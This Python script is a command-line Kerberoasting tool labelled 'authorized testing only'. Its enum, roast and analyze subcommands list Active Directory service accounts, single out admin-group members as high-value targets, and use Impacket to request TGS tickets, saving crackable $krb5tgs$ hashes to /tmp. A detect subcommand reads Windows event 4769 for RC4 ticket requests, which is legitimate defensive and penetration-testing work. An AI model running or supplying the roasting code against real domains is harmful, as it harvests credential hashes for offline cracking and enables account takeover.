#!/usr/bin/env python3
"""Agent for performing Kerberoasting attack simulation and detection — authorized testing only."""

import json
import argparse
import subprocess
import re
from datetime import datetime
from pathlib import Path


def enumerate_spn_accounts(domain=None):
    """Enumerate service principal name (SPN) accounts via LDAP query."""
    cmd = ["ldapsearch", "-x", "-H", f"ldap://{domain}" if domain else "ldap://localhost",
           "-b", f"dc={',dc='.join(domain.split('.'))}" if domain else "",
           "(&(objectClass=user)(servicePrincipalName=*))",
           "sAMAccountName", "servicePrincipalName", "memberOf", "pwdLastSet"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        accounts = []
        current = {}
        for line in result.stdout.splitlines():
            if line.startswith("dn:"):
                if current:
                    accounts.append(current)
                current = {"dn": line[4:].strip()}
            elif line.startswith("sAMAccountName:"):
                current["username"] = line.split(":", 1)[1].strip()
            elif line.startswith("servicePrincipalName:"):
                current.setdefault("spns", []).append(line.split(":", 1)[1].strip())
            elif line.startswith("memberOf:"):
                current.setdefault("groups", []).append(line.split(":", 1)[1].strip())
        if current and current.get("username"):
            accounts.append(current)
        high_value = [a for a in accounts if any("admin" in g.lower() for g in a.get("groups", []))]
        return {
            "domain": domain, "total_spn_accounts": len(accounts),
            "high_value_targets": len(high_value),
            "accounts": accounts[:30],
        }
    except FileNotFoundError:
        return _powershell_spn_enum(domain)
    except Exception as e:
        return {"error": str(e)}


def _powershell_spn_enum(domain):
    """Fallback SPN enumeration via PowerShell Get-ADUser."""
    cmd = ["powershell", "-Command",
           "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,MemberOf,PasswordLastSet | "
           "Select-Object SamAccountName,ServicePrincipalName,PasswordLastSet,@{N='Groups';E={$_.MemberOf}} | "
           "ConvertTo-Json -Depth 3"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        data = json.loads(result.stdout)
        if isinstance(data, dict):
            data = [data]
        accounts = [{"username": a.get("SamAccountName"), "spns": a.get("ServicePrincipalName", []),
                      "password_last_set": a.get("PasswordLastSet"), "groups": a.get("Groups", [])} for a in data]
        return {"total_spn_accounts": len(accounts), "accounts": accounts[:30]}
    except Exception as e:
        return {"error": f"PowerShell fallback failed: {e}"}


def request_tgs_tickets(domain, username=None):
    """Request TGS tickets for Kerberoasting using Impacket GetUserSPNs."""
    cmd = ["python3", "-m", "impacket.examples.GetUserSPNs",
           f"{domain}/", "-request", "-outputfile", "/tmp/kerberoast_hashes.txt"]
    if username:
        cmd += ["-target-user", username]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        hash_file = Path("/tmp/kerberoast_hashes.txt")
        hashes = []
        if hash_file.exists():
            for line in hash_file.read_text().strip().splitlines():
                if line.startswith("$krb5tgs$"):
                    parts = line.split("$")
                    hashes.append({"hash_type": "krb5tgs", "spn": parts[3] if len(parts) > 3 else "",
                                   "hash_preview": line[:80] + "..."})
        return {
            "domain": domain, "hashes_captured": len(hashes),
            "output": result.stdout[:500], "hashes": hashes[:20],
            "hash_file": str(hash_file) if hashes else None,
        }
    except FileNotFoundError:
        return {"error": "Impacket not installed — pip install impacket"}
    except Exception as e:
        return {"error": str(e)}


def analyze_kerberoast_hashes(hash_file):
    """Analyze captured Kerberoast hashes."""
    content = Path(hash_file).read_text(encoding="utf-8", errors="replace")
    hashes = [line.strip() for line in content.splitlines() if line.strip().startswith("$krb5tgs$")]
    enc_types = {"23": 0, "17": 0, "18": 0}
    spns = []
    for h in hashes:
        parts = h.split("$")
        if len(parts) >= 4:
            etype = parts[2] if len(parts) > 2 else "unknown"
            enc_types[etype] = enc_types.get(etype, 0) + 1
            spns.append(parts[3] if len(parts) > 3 else "unknown")
    crackable_rc4 = enc_types.get("23", 0)
    return {
        "total_hashes": len(hashes),
        "encryption_types": enc_types,
        "rc4_crackable": crackable_rc4,
        "aes_hashes": enc_types.get("17", 0) + enc_types.get("18", 0),
        "spn_targets": spns[:20],
        "risk": "HIGH" if crackable_rc4 > 0 else "MEDIUM",
        "recommendation": "Disable RC4 (etype 23) and enforce AES encryption" if crackable_rc4 > 0 else "AES encryption in use — harder to crack",
    }


def detect_kerberoasting(evtx_file=None):
    """Detect Kerberoasting from Windows Security Event ID 4769."""
    if evtx_file:
        try:
            import Evtx.Evtx as evtx
            import xml.etree.ElementTree as ET
        except ImportError:
            return {"error": "python-evtx not installed — pip install python-evtx"}
        suspicious = []
        with evtx.Evtx(evtx_file) as log:
            for record in log.records():
                xml = record.xml()
                root = ET.fromstring(xml)
                ns = {"e": "http://schemas.microsoft.com/win/2004/08/events/event"}
                event_id = root.find(".//e:EventID", ns)
                if event_id is not None and event_id.text == "4769":
                    data = {d.get("Name"): d.text for d in root.findall(".//e:Data", ns)}
                    ticket_enc = data.get("TicketEncryptionType", "")
                    if ticket_enc == "0x17":
                        suspicious.append({
                            "service": data.get("ServiceName"), "client": data.get("TargetUserName"),
                            "ip": data.get("IpAddress"), "encryption": "RC4 (0x17)",
                        })
        return {"evtx_file": evtx_file, "suspicious_tgs_requests": len(suspicious), "events": suspicious[:20]}
    cmd = ["wevtutil", "qe", "Security", "/q:*[System[EventID=4769]]", "/f:text", "/c:100"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        rc4_count = result.stdout.lower().count("0x17")
        return {"source": "live_event_log", "total_4769_events": result.stdout.count("Event ID"), "rc4_ticket_requests": rc4_count}
    except Exception as e:
        return {"error": str(e)}


def main():
    parser = argparse.ArgumentParser(description="Kerberoasting Attack Agent (Authorized Testing Only)")
    sub = parser.add_subparsers(dest="command")
    e = sub.add_parser("enum", help="Enumerate SPN accounts")
    e.add_argument("--domain", required=True)
    r = sub.add_parser("roast", help="Request TGS tickets")
    r.add_argument("--domain", required=True)
    r.add_argument("--user", help="Target specific user")
    a = sub.add_parser("analyze", help="Analyze captured hashes")
    a.add_argument("--file", required=True)
    d = sub.add_parser("detect", help="Detect Kerberoasting")
    d.add_argument("--evtx", help="EVTX file to analyze")
    args = parser.parse_args()
    if args.command == "enum":
        result = enumerate_spn_accounts(args.domain)
    elif args.command == "roast":
        result = request_tgs_tickets(args.domain, args.user)
    elif args.command == "analyze":
        result = analyze_kerberoast_hashes(args.file)
    elif args.command == "detect":
        result = detect_kerberoasting(args.evtx)
    else:
        parser.print_help()
        return
    print(json.dumps(result, indent=2, default=str))


if __name__ == "__main__":
    main()
